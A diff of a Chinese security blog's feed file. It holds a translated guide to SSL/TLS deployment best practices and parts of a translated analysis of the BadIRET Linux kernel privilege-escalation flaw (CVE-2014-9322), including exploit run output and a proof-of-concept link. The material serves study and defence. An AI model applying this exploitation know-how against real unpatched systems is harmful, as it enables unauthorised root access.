-  &lt;li&gt;使用强度不够的加密算法(比如40或者56位的加密强度)也容易被破解&lt;/li&gt;
-  &lt;li&gt;RC4比之前想象的要弱，你应该在检查好兼容问题后，尽快去除掉&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Tom Li 注：2015年三月曝光的手段将RC4攻击实用化，RC4坚决不要再用 [T4]&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;3DES仅提供大约112位的安全系数，这也低于推荐的最低128位，不过依然足够强。
-但实践中更大的问题是，她比其他替代算法要慢很多。所以，出于性能我们不推荐她，
-但她依然可以放在加密套件的最后面，用来兼容非常陈旧的客户端&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Tom Li 注：RC4安全漏洞曝光后，这是老旧客户端唯一能用的算法了&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h3 id=&quot;section-9&quot;&gt;2.4 控制加密套件选型&lt;/h3&gt;
-
-&lt;p&gt;在SSL v3和后来的版本里，客户端提交一个她支持的加密套件的列表，服务
-器从列表中选择一个去跟客户端做协商，以构建一个安全的通信信道。
-然而不是所有的服务器都能很好处理这个过程，一些服务器仅仅会简单的从列表中选择第一个。
-让服务器选择正确的加密套件对于安全而言是极端重要的（详见 Section 2.7）。&lt;/p&gt;
-
-&lt;h3 id=&quot;forward-secrecy&quot;&gt;2.5 支持正向安全（Forward Secrecy）&lt;/h3&gt;
-
-&lt;p&gt;正向安全是一个协议特性，它使得安全会话不依赖于服务器的私钥。
-当使用不支持正向安全的加密套件时，如果攻击者记录了通信内容，那么她可
-以在未来获得私钥后，再解密先前的一切通信。你需要优先支持ECDHE套装，
-来让浏览器选择支持正向安全。
-为了支持更广泛的客户端，可将DHE套件作为ECDHE的协商回退（fallback)方案。&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Shawn注: NSA就在干这件事情，所以看出PFS有多重要了吧&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h3 id=&quot;section-10&quot;&gt;2.6 关闭客户端发起的重协商&lt;/h3&gt;
-
-&lt;p&gt;在SSL/TLS里，重协商允许一方停止交换数据而去重新协商一个安全会话。有一些
-场景需要服务器发起重协商的请求，但客户端并没有发起重协商请求的必要。此
-外，曾经出现过客户端发起重协商请求的拒绝服务攻击。&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Shawn注解: 每个重协商请求服务器的计算量是客户端的15倍&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h3 id=&quot;section-11&quot;&gt;2.7 降低已知漏洞风险&lt;/h3&gt;
-
-&lt;p&gt;没有什么是绝对安全的，很多防护方案都会随着时间推移成为安全问题。最佳实
-践是随时关注信息安全的世界在发生些什么，然后采取必要的措施。最简单的是你
-应该尽快的打每一个补丁。&lt;/p&gt;
-
-&lt;p&gt;下面的一些问题应该引起你的注意：&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;关闭不安全的重协商&lt;/p&gt;
-
-    &lt;p&gt;重协商特性在2009年时被发现是不安全的，协议需要更新。今天大部分厂商已
-经修复，至少提供了一个临时方案。不安全的重协商很危险，因为她很容易被
-利用，用来进行跨站请求伪造（CSFR）攻击，并在某些情况下引发跨站脚本（XSS）
-攻击。&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;关闭TLS压缩&lt;/p&gt;
-
-    &lt;p&gt;2012年，CRIME攻击[6]向我们展示了TLS压缩所导致的信息泄漏可以被攻击者用
-于还原部分的敏感数据(比如session cookies)。只有几款客户端支持TLS
-压缩（而现在就更少了），所以即使关掉TLS压缩，也完全不会遇到服务器性能
-问题。针对TLS压缩的攻击风险有限。&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;降低HTTP压缩的信息泄漏风险&lt;/p&gt;
-
-    &lt;p&gt;2个CRIME的变种攻击在2013年被曝光，不像CRIME针对TLS压缩，TIME和BREACH
-漏洞是针对压缩过的HTTP响应。HTTP压缩对于很多公司都很重要，这个
-问题不容易解决。风险减缓方案可能需要修改业务代码。&lt;/p&gt;
-
-    &lt;p&gt;对于TIME和BREACH攻击，只要攻击者有足够攻击你的理由，那影响等同于CSRF。&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;关闭RC4&lt;/p&gt;
-
-    &lt;p&gt;RC4 cihpersuites已经被认为是不安全而且应该关闭。目前，对于攻击者最好
-的情况需要百万次的请求，和大量的带宽。因此危害是比较低的，不过我们期待
-未来有改进的攻击手法。在去除RC4之前，检查这是否会影响现有的用户；换句话
-说，你应该查查有没有仅支持RC4的客户端。&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;注意BEAST攻击&lt;/p&gt;
-
-    &lt;p&gt;2011年曝光的BEAST攻击是2004年的一个针对TLS 1.0或者更早版本但当时被认
-为很难被利用的一个漏洞。一次成功的BEAST攻击的影响约等于会话劫持。在一段时间内，
-尽管问题出在客户端，在服务端避免BEAST攻击是合适的。但不幸的是，
-服务器需要使用RC4来避免问题，而这已经不再推荐了。因为这个原因，再加上
-目前BEAST攻击已经在大量客户端中被解决了，我们不再推荐在服务端避免攻击。
-在有大量旧客户端受BEAST攻击影响的情况下，使用RC4和TLS 1.0也许更安全。
-如何取舍需要在完全了解环境，建立威胁模型后小心决定。&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;关闭SSLv3&lt;/p&gt;
-
-    &lt;p&gt;SSLv3受到2014年10月曝光的POODLE攻击威胁。此攻击很容易被利用来攻击HTTP客户端运行
-JavaScript恶意程序。客户端也很容易被攻击者忽悠，从一个更安全的协议（如 TLSv1.2）
-降级到不安全的SSLv3。因此最好的解决方案是在服务器完全禁用SSLv3，绝大多数站点都
-可以安全的实施。&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Lenx注: 由于国内仍然存在大量IE 6客户端，不支持TLS 1.x。目前如果必须
-  要支持SSLv3，那么只能选择RC4，并注意开启TLS_FALLBACK_SCSV防止降级攻击。
-  此外注意库的及时升级，相关漏洞是一茬接着一茬的。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h2 id=&quot;section-12&quot;&gt;3. 性能&lt;/h2&gt;
-
-&lt;p&gt;这份文档中安全是主要关注点，但我们也必须注意到性能的问题。一个安全服
-务不能满足性能需求无疑会被遗弃掉。然而，因为TLS配置通常不会带来很大的性
-能开销，我们把讨论限定在会导致严重性能下降的常见配置问题上。&lt;/p&gt;
-
-&lt;h3 id=&quot;section-13&quot;&gt;3.1 不要使用强度过高的私钥&lt;/h3&gt;
-
-&lt;p&gt;在建立一条安全连接的密钥协商的过程当中最大的开销是由私钥大小决定的，使
-用密钥过短会不安全，使用密钥过长会的导致在一些场景无法忍受的性能下降。
-对于大多的WEB站点，使用超过2048位的RSA/DHE密钥，或者超过256位的ECDSA/ECDHE密钥是浪
-费CPU和影响用户体验的。&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Shawn注：256-bit的&lt;a href=&quot;https://tools.ietf.org/html/rfc4492&quot;&gt;ECC密钥强度&lt;/a&gt;足够胜任很长一段时间&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h3 id=&quot;session&quot;&gt;3.2 确保正确使用Session重用&lt;/h3&gt;
-
-&lt;p&gt;Session重用是一种性能优化技术，让耗时的密码计算操作的结果在一段时间里可重复使
-用。当Session重用机制失效时可能会导致严重性能下降。&lt;/p&gt;
-
-&lt;h3 id=&quot;http&quot;&gt;3.3 使用持久性链接(HTTP)&lt;/h3&gt;
-
-&lt;p&gt;今天绝大多数SSL开销并非来自CPU密集型的密码计算操作，而是网络延迟。一个TLS握
-手是建立在TCP握手结束后，她需要交换更多的数据包。为了让网络延迟最小化，
-你应该启用HTTP持久化( keep-alives)，从而让你的用户能在一个TCP链接上发多次
-HTTP请求。&lt;/p&gt;
-
-&lt;h3 id=&quot;http-1&quot;&gt;3.4 为公共资源开启缓存(HTTP)&lt;/h3&gt;
-
-&lt;p&gt;当使用TLS通信时，浏览器会假设所有的流量都是敏感信息。浏览器会把一些特定的
-资源缓存到内存里，但是一旦你关闭了浏览器，这些内容就丢失了。为了提升性
-能，为一些资源开启长期缓存，通过加入”Cache-Control: public”返回header给
-浏览器标记为公共资源（比如图片）。&lt;/p&gt;
-
-&lt;h3 id=&quot;ocsp-stapling&quot;&gt;3.5 使用 OCSP Stapling&lt;/h3&gt;
-
-&lt;p&gt;OCSP Staling是改版的OSCP协议，使得传递证书吊销信息成为TLS握手的一部分，直接
-从服务器传递到浏览器。因此，浏览器不再需要额外联系OCSP服务器来验证服务器，
-从而大幅降低连接耗时。&lt;/p&gt;
-
-&lt;h2 id=&quot;http-2&quot;&gt;4. 应用设计（HTTP）&lt;/h2&gt;
-
-&lt;p&gt;HTTP协议和WEB相关平台在SSL诞生后仍然在不断的进化。进化的结果就是有一些
-今天包含的特性已经对加密不利。在这个Section里，我们会罗列出这些特性，也
-包括如何安全的使用它们。&lt;/p&gt;
-
-&lt;h3 id=&quot;section-14&quot;&gt;4.1 100%的加密你的网站&lt;/h3&gt;
-
-&lt;p&gt;事实上”加密是一个备选“的思想大概是今天最严重的安全问题之一。我们来看看
-以下问题：&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;网站应该用TLS但没用&lt;/li&gt;
-  &lt;li&gt;网站有TLS但不是强制性的使用&lt;/li&gt;
-  &lt;li&gt;网站混合了TLS和非TLS的内容，有时候甚至在相同的网页上&lt;/li&gt;
-  &lt;li&gt;网站编程错误导致TLS被攻陷&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;虽然如果你知道你自己在做什么的话，这些问题大部分是可以避免的。然而一般而言，
-唯一有效的方式是强制对所有的内容通信进行加密 —— 没有豁免。&lt;/p&gt;
-
-&lt;h3 id=&quot;section-15&quot;&gt;4.2 避免混合内容&lt;/h3&gt;
-
-&lt;p&gt;混合内容的页面是已经使用TLS，但有些资源（比如JavaScript文件，图片，
-CSS）是通过非TLS的方式传输的。这些页面不安全，主动的中间人攻击者可以劫持这
-些不受保护的JavaScript的资源，从而……例如劫持整个用户会话。就算你遵循了前面的
-建议加密了自己网站上所有的内容，但也不排除来自第三方网站的资源是没有加密的。&lt;/p&gt;
-
-&lt;h3 id=&quot;section-16&quot;&gt;4.3 理解信任第三方&lt;/h3&gt;
-
-&lt;p&gt;网站通常会通过来自其他服务器的JavaScript代码来使用第三方的服务，Google Analytics是一个
-应用广泛的例子。内含的第三方代码创建了一个隐式的信任链，让第三方可以完
-全控制你的网站。第三方本身可能并没有恶意，但他们很容易成为攻击者的目标。
-原因很简单，如果一个大型第三方提供商被攻陷，那攻击者就可以利用这一路径
-导致所有使用它的人全都自动被攻陷。&lt;/p&gt;
-
-&lt;p&gt;如果你采纳了Section 4.2的建议，至少你的第三方链接在加密后可以防止中间人
-攻击。此外，你应该进一步去了解你的站点使用了哪些服务，去除、替换或者承担其中的
-风险并继续使用。&lt;/p&gt;
-
-&lt;h3 id=&quot;cookies&quot;&gt;4.4 安全Cookies&lt;/h3&gt;
-
-&lt;p&gt;为了安全，网站需要TLS。然而网站使用的cookies也要标记为安全。如果不能保护cookies，就
-让中间人攻击者使用诡计获取信息成为可能，即使网站本身是100%加密的。&lt;/p&gt;
-
-&lt;h3 id=&quot;hsts&quot;&gt;4.5 部署HSTS&lt;/h3&gt;
-
-&lt;p&gt;HTTP严格传输安全（HSTS）是TLS协议的保护伞：它被设计成即使存在配置和实现错误的情况下，依然能保证安全。
-设置一个简单的响应header就能在支持HSTS的浏览器（目前是 Chrome、FireFox、Safari 和
-Opear，IE 很快就会支持）上激活保护。&lt;/p&gt;
-
-&lt;p&gt;HSTS的目的是很简单的：在激活之后，它就会禁止与网站进行任何不安全通信，自动把明文链接转换
-成安全链接。一个额外的特性让用户不能无视证书警告（证书警告是
-中间人攻击的标志，而研究表明大多数用户都会无视警告，最好永远不要让用户这么做）&lt;/p&gt;
-
-&lt;p&gt;支持HSTS是一项能大幅度提高你网站TLS安全性的措施。新的网站应该在设计的时候就考虑到HSTS，而旧的
-站点则应该尽快支持。&lt;/p&gt;
-
-&lt;h3 id=&quot;section-17&quot;&gt;4.6 关闭敏感内容的缓存&lt;/h3&gt;
-
-&lt;p&gt;敏感内容应该被确实看作是敏感，只能发送给该知道的一方。尽管代理服务器看不到加密流量，
-也不能把它共享给别人，但是随着基于云的应用在增加，你必须得小心区分公开资源和敏感内容。&lt;/p&gt;
-
-&lt;h3 id=&quot;section-18&quot;&gt;4.7 确保没有其他漏洞&lt;/h3&gt;
-
-&lt;p&gt;TLS不代表就安全，TLS的设计只是涉及安全的一个方面–通信过程中的保密性和
-完整性——但还有其他威胁你必须面对。&lt;/p&gt;
-
-&lt;h2 id=&quot;validation&quot;&gt;5. Validation&lt;/h2&gt;
-
-&lt;p&gt;在配置的时候可以进行调整的参数有一大堆，而你很难完全了解修改什么会有什么影响，
-而有些时候改动可能是无意的；软件升级也会悄悄引入变化。因此，我们建议使用一款
-SSL/TLS评估工具来检查你的配置是不是真的安全，并定期运行检查保证你一直都安全。
-对于公开站点，我们推荐使用&lt;a href=&quot;https://www.ssllabs.com/ssltest/&quot;&gt;SSLLab网站上的免费在线工具&lt;/a&gt;
-它的“握手模拟”功能在实践中非常有用，可以让不同的TLS客户端连接时时候的参数一清二楚。&lt;/p&gt;
-
-&lt;h2 id=&quot;section-19&quot;&gt;6. 高级议题&lt;/h2&gt;
-
-&lt;p&gt;下面的这些议题超出了这份文档的范畴，她们需要对SSL/TLS和公钥架构(PKI)有
-更深的理解，这些议题依然是受到争议的。&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;Extended Validation证书&lt;/p&gt;
-
-    &lt;p&gt;EV证书是很靠谱的证书，只有经过充分的线下审核后才给予颁发。证书的目的是明确
-机构和它的对应线上网站的身份联系。EV证书更难伪造，提供了更好的安全性，
-并且在浏览器上呈现给用户时的待遇也更高。&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Public key pinning&lt;/p&gt;
-
-    &lt;p&gt;Public key pinning的设计是为网站运维能限制哪些CA才可以为他们的网站签
-发证书。这个特性是Google开发的，目前已经硬编码到了Chrome浏览器里面，
-并且证明对避免攻击和引发大众关注非常有效。在2014年，FireFox也加入了对
-硬编码pinning的支持。一个叫做《HTTP的Pubilc Key Pinning扩展》的标准已经
-发展了很长时间了，很快讲会发布。我们期待这个特性今后至少被主流浏览器支持。&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;ECDSA私钥&lt;/p&gt;
-
-    &lt;p&gt;事实上所有的网站都依赖于RSA私钥。这个算法是WEB通信安全的基础。因为一
-些原因，我们正在从1024位转向2048位的RSA密钥。而增加密钥长度可能会带来
-性能问题。椭圆曲线密码学(ECC)使用了不同的数学，能在较小的密钥长度下有
-较强的安全性。RSA密钥可以被ECDSA替代，目前只有少数的CA支持ECDSA，但我
-们期待未来会有更多。在迁移到ECDSA的时候，一个主要的问题是并非所有的
-客户端都支持它，如果你考虑使用ECDSA，应该确认它是否会影响用户连接服务器。
-有些平台支持双密钥部署，可以让你同时使用RSA和ECDSA以适配所有的客户端。&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;改动&lt;/p&gt;
-
-&lt;p&gt;这份文档的最初的版本是在2012年2月24日发布的。这个Section跟踪了文档修改
-的时间，从1.3开始。&lt;/p&gt;
-
-&lt;p&gt;版本 1.3 (2013年9月17日)
-此版本的改动有：
-• 推荐替换1024位证书
-• 推荐不对SSLv3进行支持
-• 删去推荐使用RC4来服务端避免BEAST攻击的内容
-• 推荐禁用RC4
-• 推荐在未来禁用3DES
-• 警告关于CRIME攻击的变种（TIME和BREACH攻击）
-• 推荐支持正向安全
-• 加入对ECDSA证书的讨论&lt;/p&gt;
-
-&lt;p&gt;版本 1.4 (2014年12月8日）
-此版本的改动有：
-• 讨论SHA1过时的问题，推荐迁移到SHA2系列算法
-• 推荐禁用SSLv3，提及POODLE攻击
-• 扩张Sectios 3.1，涵盖DHE和ECDHE密钥交换强度
-• 推荐OCSP Stap&lt;/p&gt;
-
-&lt;p&gt;感谢&lt;/p&gt;
-
-&lt;p&gt;为了有价值的反馈和起草这份文档，特别感谢Marsh Ray (PhoneFactor), Nasko
-Oskov (Google), Adrian F. Dimcev和Ryan Hurst(GlobalSign)。也感谢其他慷
-慨的分享关于信息安全和密码学的人。这份文档虽然是我写的，但这些内容则来
-自整个安全社区。&lt;/p&gt;
-
-&lt;p&gt;关于SSL Labs
-……………..&lt;/p&gt;
-
-&lt;p&gt;关于Qualys
-…………….&lt;/p&gt;
-
-&lt;p&gt;[1] SHA1 Deprecation Policy (Windows PKI blog, 12 November 2013)
-http://blogs.technet.com/b/pki/archive/2013/11/12/sha1-deprecation-policy.aspx&lt;/p&gt;
-
-&lt;p&gt;[2] Gradually Sunsetting SHA-1 (The Chromium Blog, 5 September 2014)
-http://blog.chromium.org/2014/09/gradually-sunsetting-sha-1.html&lt;/p&gt;
-
-&lt;p&gt;[3] On the Security of RC4 in TLS and WPA (Kenny Paterson et al.; 13 March 2013)
-http://www.isg.rhul.ac.uk/tls/&lt;/p&gt;
-
-&lt;p&gt;[4] Deploying Forward Secrecy (Qualys Security Labs; 25 June 2013)
-https://community.qualys.com/blogs/securitylabs/2013/06/25/ssl-labs-deploying-forward-secrecy&lt;/p&gt;
-
-&lt;p&gt;[5] Increasing DHE strength on Apache 2.4.x (Ivan Ristić’s blog; 15 August 2013)
-http://blog.ivanristic.com/2013/08/increasing-dhe-strength-on-apache.html&lt;/p&gt;
-
-&lt;p&gt;[6] TLS Renegotiation and Denial of Service Attacks (Qualys Security Labs Blog, October 2011)
-https://community.qualys.com/blogs/securitylabs/2011/10/31/tls-renegotiation-and-denial-of-service-attacks&lt;/p&gt;
-
-&lt;p&gt;[7] SSL and TLS Authentication Gap Vulnerability Discovered (Qualys Security Labs Blog; November 2009)
-https://community.qualys.com/blogs/securitylabs/2009/11/05/ssl-and-tls-authentication-gap-vulnerability-discovered&lt;/p&gt;
-
-&lt;p&gt;[8] CRIME: Information Leakage Attack against SSL/TLS (Qualys Security Labs Blog; September 2012)
-https://community.qualys.com/blogs/securitylabs/2012/09/14/crime-information-leakage-attack-against-ssltls&lt;/p&gt;
-
-&lt;p&gt;[9] Defending against the BREACH Attack (Qualys Security Labs; 7 August 2013)
-https://community.qualys.com/blogs/securitylabs/2013/08/07/defending-against-the-breach-attack&lt;/p&gt;
-
-&lt;p&gt;[10] Internet-Draft: Prohibiting RC4 Cipher Suites (A. Popov, 1 October 2014)
-http://datatracker.ietf.org/doc/draft-ietf-tls-prohibiting-rc4/&lt;/p&gt;
-
-&lt;p&gt;[11] Mitigating the BEAST attack on TLS (Qualys Security Labs Blog; October 2011)
-https://community.qualys.com/blogs/securitylabs/2011/10/17/mitigating-the-beast-attack-on-tls&lt;/p&gt;
-
-&lt;p&gt;[12] Is BEAST Still a Threat? (Qualys Security Labs; 10 September 2013)
-https://community.qualys.com/blogs/securitylabs/2013/09/10/is-beast-still-a-threat&lt;/p&gt;
-
-&lt;p&gt;[13] This POODLE bites: exploiting the SSL 3.0 fallback (Google Online Security Blog, 14 October 2014)
-http://googleonlinesecurity.blogspot.co.uk/2014/10/this-poodle-bites-exploiting-ssl-30.html&lt;/p&gt;
-
-&lt;p&gt;[14] About EV SSL Certificates (CA/B Forum web site)
-https://www.cabforum.org/certificates.html&lt;/p&gt;
-
-&lt;p&gt;[T1] HAS THE RSA ALGORITHM BEEN COMPROMISED AS A RESULT OF BERNSTEIN’S PAPER?
-http://www.emc.com/emc-plus/rsa-labs/historical/has-the-rsa-algorithm-been-compromised.htm&lt;/p&gt;
-
-&lt;p&gt;[T2] Poodle Bites TLS
-https://community.qualys.com/blogs/securitylabs/2014/12/08/poodle-bites-tls&lt;/p&gt;
-
-&lt;p&gt;[T3] Lucky Thirteen: Breaking the TLS and DTLS Record Protocols
-http://www.isg.rhul.ac.uk/tls/Lucky13.html&lt;/p&gt;
-</description>
-        <pubDate>Wed, 29 Jul 2015 01:59:07 +0800</pubDate>
         <link>http://www.hardenedlinux.org/cryptography/2015/07/29/ssl-tls-deployment-1.4.html</link>
         <guid isPermaLink="true">http://www.hardenedlinux.org/cryptography/2015/07/29/ssl-tls-deployment-1.4.html</guid>
         
@@ -2785,8 +2881,8 @@ swapgs.c:175:29: warning: cast from pointer to integer of different size [-Wpoin
 [pi3@localhost clean_9322]$ ./procrop
 
         ...::: -=[ Exploit for CVE-2014-9322 ]=- :::...
-                           by Rafal 'n3rgal' Wojtczuk
-                           &amp;amp;&amp;amp; Adam 'pi3' Zabrocki
+                           by Rafal &#39;n3rgal&#39; Wojtczuk
+                           &amp;amp;&amp;amp; Adam &#39;pi3&#39; Zabrocki
 
                 Usage: ./procrop 
 
@@ -2798,8 +2894,8 @@ swapgs.c:175:29: warning: cast from pointer to integer of different size [-Wpoin
 [1] 5827
 [pi3@localhost clean_9322]$
         ...::: -=[ Exploit for CVE-2014-9322 ]=- :::...
-                           by Rafal 'n3rgal' Wojtczuk
-                           &amp;amp;&amp;amp; Adam 'pi3' Zabrocki
+                           by Rafal &#39;n3rgal&#39; Wojtczuk
+                           &amp;amp;&amp;amp; Adam &#39;pi3&#39; Zabrocki
 
         [+] Using kernel target: 3.11.10-301.fc20.x86_64
 
@@ -2811,8 +2907,8 @@ pi3       5829  0.0  0.1 112660   916 pts/1    S+   23:12   0:00 grep --color=au
 [pi3@localhost clean_9322]$ ./p_write8
 
         ...::: -=[ Exploit for CVE-2014-9322 ]=- :::...
-                           by Rafal 'n3rgal' Wojtczuk
-                           &amp;amp;&amp;amp; Adam 'pi3' Zabrocki
+                           by Rafal &#39;n3rgal&#39; Wojtczuk
+                           &amp;amp;&amp;amp; Adam &#39;pi3&#39; Zabrocki
 
                 Usage: ./p_write8 
 
@@ -2824,8 +2920,8 @@ pi3       5829  0.0  0.1 112660   916 pts/1    S+   23:12   0:00 grep --color=au
 [pi3@localhost clean_9322]$ ./p_write8 1
 
         ...::: -=[ Exploit for CVE-2014-9322 ]=- :::...
-                           by Rafal 'n3rgal' Wojtczuk
-                           &amp;amp;&amp;amp; Adam 'pi3' Zabrocki
+                           by Rafal &#39;n3rgal&#39; Wojtczuk
+                           &amp;amp;&amp;amp; Adam &#39;pi3&#39; Zabrocki
 
         [+] Using kernel target: 3.11.10-301.fc20.x86_64
         [+] mmap() memory in first 2GB of address space... DONE!
@@ -2875,2093 +2971,6 @@ exit
         <pubDate>Mon, 06 Jul 2015 06:00:07 +0800</pubDate>
         <link>http://www.hardenedlinux.org/system-security/2015/07/06/badiret-exp.html</link>
         <guid isPermaLink="true">http://www.hardenedlinux.org/system-security/2015/07/06/badiret-exp.html</guid>
-        
-        
-        <category>system-security</category>
-        
-      </item>
-    
-      <item>
-        <title>漏洞利用&quot;BadIRET&quot;分析(CVE-2014-9322, Linux内核提权)</title>
-        <description>&lt;p&gt;作者：Rafal Wojtczuk，Feb 2 2015&lt;/p&gt;
-
-&lt;p&gt;原文：&lt;a href=&quot;http://labs.bromium.com/2015/02/02/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/&quot;&gt;Exploiting “BadIRET” vulnerability (CVE-2014-9322, Linux kernel privilege escalation)&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;译者：Shawn the R0ck, Feb 5 2015&lt;/p&gt;
-
-&lt;p&gt;POC( 感谢Mickey提供的链接):
-https://rdot.org/forum/showthread.php?t=3341&lt;/p&gt;
-
-&lt;p&gt;Solidot相关报道：
-http://www.solidot.org/story?sid=42951&lt;/p&gt;
-
-&lt;p&gt;Shawn：Linux内核代码文件arch/x86/kernel/entry_64.S在3.17.5之前的版本都
-没有正确的处理跟SS（堆栈区）段寄存器相关的错误，这可以让本地用户通过触
-发一个 IRET指令从错误的地址空间去访问GS基地址来提权。这个编号为
-CVE-2014-9322,漏洞于2014年11月23日被Linux内核社区修复，之后的几个礼拜里
-没有出现公开的利用代码甚至相关的讨论。当人们快要遗忘这个威胁的时候，
-Rafal Wojtczuk的分析文章Exploiting “BadIRET” vulnerability似乎在提醒我
-们：别忘了斯拉夫兵工厂。Rafal在Fedora 20 64-bit GNU/Linux发行版上完成了
-研究和测试工作，内核是3.11.10-301。也提醒那些平时不重视安全运维的企业和
-个人，修复已知漏洞是必须的工作，因为你永远不知道你的敌人在哪里买卖什么
-样的数字军火。对于这个漏洞，本文的结论是SMEP虽然被绕过了，但SMAP是依然
-奏效的，这里只想提一下类似PaX/Grsecurity的UDEREF特性和SMAP类似，只是属
-于纯软件实现，大概2006/2007年左右这个特性就已经有了而且被一些anarchy广
-泛使用。这次Rafal也谈到说这个如此严重的漏洞居然数月都没有公开讨论，但其
-实在12月中旬俄罗斯的某技术社区就已经进行了详细讨论并最终给出了PoC，这是
-一次针对非英文世界的公开威胁情报分析的重大失误的典型案例。随着Intel在
-CPU里实现了类似UDEREF的SMEP和SMAP等特性，主流GNU/Linux发行版的内核也在
-逐渐支持此类特性，防御在升级的同时，欧罗巴的数字军火也在不断升级，2014
-年已经有多个团队实现了不touch用户空间的SYSRET漏洞利用。&lt;/p&gt;
-
-&lt;p&gt;这个漏洞影响很广，&lt;a href=&quot;https://security-tracker.debian.org/tracker/CVE-2014-9322&quot;&gt;Debian&lt;/a&gt;几乎所有社区还在维护的版本都受影响。&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://access.redhat.com/security/cve/CVE-2014-9322&quot;&gt;RedHat的企业版&lt;/a&gt;RHEL 4/5/6/7都受影响。&lt;/p&gt;
-
-&lt;h2 id=&quot;intro&quot;&gt;0. Intro&lt;/h2&gt;
-
-&lt;p&gt;CVE-2014-9322的描述如下：&lt;/p&gt;
-&lt;pre&gt;
-linux内核代码文件arch/x86/kernel/entry_64.S在3.17.5之前的版本都没有正确
-的处理跟SS（堆栈区）段寄存器相关的错误，这可以让本地用户通过触发一个
-IRET指令从错误的地址空间去访问GS基地址来提权。
-&lt;/pre&gt;
-
-&lt;p&gt;这个漏洞于2014年11月23日被社区修复[2]，至今我并没有见到公开的利用代码和
-详细的讨论。这篇文章我会尝试去解释这个漏洞的本质以及利用的过程。不幸的
-是，我无法完全引用Intel白皮书[3]的所有内容，如果有读者不熟悉一些术语可
-以直接查Intel白皮书。所有的实验都是在Fedora 20 64-bit发行版上完成的，内
-核是3.11.10-301，所有的讨论基于64位进行。&lt;/p&gt;
-
-&lt;p&gt;简单结论概要：&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;
-    &lt;p&gt;通过测试，这个漏洞可以完全稳定的被利用。&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;SMEP[4]不能阻止任意代码执行；SMAP[5]可以阻止任意代码执行。&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;Digression: kernel, usermode, iret
-&lt;img src=&quot;https://bromiumlabs.files.wordpress.com/2015/01/badiret-cartoon.jpg?w=893&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;section&quot;&gt;2. 漏洞&lt;/h2&gt;
-
-&lt;p&gt;在一些情况下，linux内核通过iret指令返回用户空间时会产生一个异常。异常处
-理程序把执行路径返回到了bad_iret函数，她做了：&lt;/p&gt;
-
-&lt;pre&gt;
-     /* So pretend we completed the iret and took the #GPF in user mode.*/
-     pushq $0
-     SWAPGS
-     jmp general_protection
-&lt;/pre&gt;
-
-&lt;p&gt;正如这行评论所解释，接下来的代码流应该和一般保护异常(General
-Protection)在用户空间发生时（转跳到#GP处理程序）完全相同。这种异常处理
-情况大多是由iret指令引发的，e.g. #GP。&lt;/p&gt;
-
-&lt;p&gt;问题在于#SS异常。如果有漏洞的内核（比如3.17.5）也有”espfix”功能（从
-3.16引入的特性），之后bad_iret函数会在只读的栈上执行”push”指令，这会导
-致页错误（page fault）而会直接引起两个错误。我不考虑这种场景；从现在开
-始，我们只关注在3.16以前的没有”espfix”的内核。&lt;/p&gt;
-
-&lt;p&gt;这个漏洞根源于#SS的异常处理程序没有符合
-“pretend-it-was-#GP-in-userspace”[6]的规划，与#GP处理程序相比，#SS异常
-处理会多做一次swapgs指令。如果你对swapgs不了解，请不要跳过下面的章节。&lt;/p&gt;
-
-&lt;h2 id=&quot;swapgs&quot;&gt;3. 偏题：swapgs指令&lt;/h2&gt;
-
-&lt;p&gt;当内存通过gs段进行访问时，像这样：&lt;/p&gt;
-
-&lt;pre&gt;
-mov %gs:LOGICAL_ADDRESS, %eax
-&lt;/pre&gt;
-
-&lt;p&gt;实际会发生以下几步：&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;
-    &lt;p&gt;BASE_ADDRESS值从段寄存器的隐藏部分取出&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;内存中的线性地址LOGICAL_ADDRESS+BASE_ADDRESS被dereferenced（Shawn:
-char *p; *p就是deref）。&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;基地址是从GDT（或者LDT）继承过来的。无论如何，有一些情况是GS段基地址被
-修改的动作不需要GDT的参与。&lt;/p&gt;
-
-&lt;p&gt;引用自Intel白皮书：&lt;/p&gt;
-
